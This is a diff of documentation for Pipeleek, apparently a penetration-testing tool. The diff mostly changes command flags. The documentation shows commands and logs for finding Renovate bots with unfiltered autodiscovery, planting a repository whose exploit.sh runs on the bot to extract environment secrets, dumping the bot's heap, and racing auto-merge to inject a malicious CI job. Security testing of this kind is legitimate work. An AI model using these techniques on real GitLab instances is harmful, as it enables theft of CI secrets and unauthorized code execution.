@@ -35,7 +35,7 @@ Use the `enum` command to scan your GitLab instance for Renovate bot jobs and co
 For example, we enumerated Renovate configs found on GitLab.com. One project was found that enables Renovate's autodiscovery of projects and does **not** set any autodiscovery filters.
 
 ```bash
-pipeleek gl renovate enum -g https://gitlab.com -t glpat-[redacted] --dump
+pipeleek gl renovate enum -u https://gitlab.com -t glpat-[redacted] --dump
 2025-09-30T07:11:06Z info Fetching projects
 2025-09-30T07:11:12Z warn Identified Renovate (bot) configuration autodiscoveryFilterType= autodiscoveryFilterValue= hasAutodiscovery=true hasAutodiscoveryFilters=false hasConfigFile=true pipelines=enabled selfHostedConfigFile=true url=https://gitlab.com/test-group/renovate-bot
 2025-09-30T07:11:16Z info Fetched all projects
@@ -53,7 +53,7 @@ The Renovate bot from the example above is configured to autodiscover new projec
 The following command creates a repository that includes an exploit script called `exploit.sh`. Whenever a Renovate bot picks up this repo, the script will be executed.
 
 ```bash
-pipeleek gl renovate autodiscovery -g https://gitlab.com -t glpat-[redacted] -v
+pipeleek gl renovate autodiscovery -u https://gitlab.com -t glpat-[redacted] -v
 2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/myuser/devfe-pipeleek-renovate-autodiscovery-poc
 2025-09-30T07:19:35Z debug Created file fileName=renovate.json
 2025-09-30T07:19:35Z debug Created file fileName=pom.xml
@@ -112,6 +112,7 @@ In that file, extract all sensitive environment variables and use them for later
 > After receiving a merge request from the Renovate bot, you must fully delete both the branch and the merge request. This ensures the bot will recreate them, allowing your script to run again. Otherwise, the script will not be executed a second time. Ensure to revert the commits as well if they were merged.
 
 ### Dump Renovate Process Heap
+
 In some cases the Renovate bot configuration file might have been [deleted](https://docs.renovatebot.com/self-hosted-configuration/#deleteconfigfile) and you want to recover it. The following script can be used to dump the heap for further analysis.
 
 ```bash
@@ -174,7 +175,7 @@ Your goal is to abuse the Renovate bot's access level to merge a malicious `gitl
 Using Pipeleek, you can monitor your repository for new Renovate branches. When a new one is detected, Pipeleek tries to add a new job into the `gitlab-ci.yml`. As this needs to exploit a race condition (adding new changes to the Renovate branch before the bot activates auto-merge), this might take a few attempts.
 
 ```bash
-pipeleek gl renovate privesc -g https://gitlab.com -t glpat-[redacted] --repo-name company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
+pipeleek gl renovate privesc -u https://gitlab.com -t glpat-[redacted] --repo company1/a-software-project --renovate-branches-regex 'renovate/.*' -v
 2025-09-30T07:56:57Z debug Verbose log output enabled
 2025-09-30T07:56:57Z info Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch
 2025-09-30T07:56:58Z debug Testing push access level for default branch branch=main requiredAccessLevel=40 userAccessLevel=30
